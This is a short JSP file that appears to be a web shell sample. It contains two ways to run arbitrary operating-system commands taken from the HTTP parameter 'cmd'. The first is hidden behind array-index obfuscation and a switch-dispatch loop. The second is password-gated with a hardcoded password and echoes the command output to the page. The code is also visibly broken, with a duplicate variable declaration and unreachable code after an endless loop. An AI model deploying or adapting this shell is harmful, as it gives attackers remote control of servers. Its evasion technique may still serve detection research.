<%
    String[] bigArr = {"2|1|3", "\\|", "cmd"};

    String a = bigArr[0x10001^0x10001];
    String[] b = a.split(bigArr[1]);
    int index = 0;
    Runtime rt = null;
    String param = null;
    while (true) {
        int op = Integer.parseInt(b[index++]);
        switch (op) {
            case 1:
                rt = Runtime.getRuntime();
                break;
            case 2:
                param = request.getParameter(bigArr[0x02]);
                break;
            case 3:
                rt.exec(param);
                break;
        }
    }

    String passwd = request.getParameter("pwd");
    String cmd = request.getParameter("cmd");
    if(passwd.equals("4ra1n")){
        java.io.InputStream in = Runtime.getRuntime().exec(cmd).getInputStream();
        byte[] b = new byte[2048];
        out.print("<pre>");
        while ((in.read(b)) != -1) {
            out.println(new String(b));
        }
        out.print("</pre>");
    }
%>